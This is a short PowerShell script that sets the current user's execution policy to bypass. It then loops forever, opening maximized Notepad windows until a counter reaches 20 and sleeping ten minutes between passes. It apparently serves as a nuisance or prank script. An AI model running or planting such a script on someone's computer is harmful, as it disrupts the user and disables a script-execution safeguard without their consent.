set-executionpolicy -Scope CurrentUser bypass
while($true)
{
    while($val -ne 20)
    {
        $val++
        Start-Process -FilePath notepad -windowstyle maximized
    }
    Start-Sleep -s 600
}